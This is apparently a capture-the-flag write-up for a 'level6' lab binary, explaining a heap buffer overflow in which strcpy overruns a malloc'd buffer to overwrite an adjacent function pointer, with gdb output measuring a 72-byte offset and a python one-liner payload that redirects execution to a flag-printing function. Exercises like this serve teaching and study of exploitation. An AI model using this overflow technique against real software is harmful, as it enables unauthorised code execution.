# level6

This time it's about heap buffer overflows.

There are 2 functions other than `main`:
- `m` simply prints "Nope"
- `n` call `cat` to display the flag

`main` has two calls to `malloc`, the first one to allocate a buffer, and the second one to store a pointer. It then stores the address of `m` in the second one before calling `strcpy` to copy the first argument into the buffer.

The attack will take advantage of the fact that the memory segments returned by `malloc` are adjacent. Just like a heap buffer overflow, we need to find how many bytes we need to overwrite to write over the address.

We can do it by setting breakpoints after each `malloc` call and displaying the value in `$eax`:
```gdb
(gdb) b *0x08048491
Breakpoint 1 at 0x8048491
(gdb) commands
Type commands for breakpoint(s) 1, one per line.
End with a line saying just "end".
>p (void *)$eax
>c
>end
(gdb) b *0x080484a1
Breakpoint 2 at 0x80484a1
(gdb) commands
Type commands for breakpoint(s) 2, one per line.
End with a line saying just "end".
>p (void *)$eax
>end
(gdb) r
Starting program: /home/user/level6/level6

Breakpoint 1, 0x08048491 in main ()
$1 = (void *) 0x804a008

Breakpoint 2, 0x080484a1 in main ()
$2 = (void *) 0x804a050
(gdb) p $2-$1
$3 = 72
```

Lets also not forget to get the address of `n`:
```gdb
(gdb) p n
$6 = {<text variable, no debug info>} 0x8048454 <n>
```

Now all we have to do is craft our payload, and give it as a parameter!

```bash
./level6 $(python -c 'print "A" * 72 + "\x08\x04\x84\x54"[::-1]')
```

Pretty easy overall. 😎
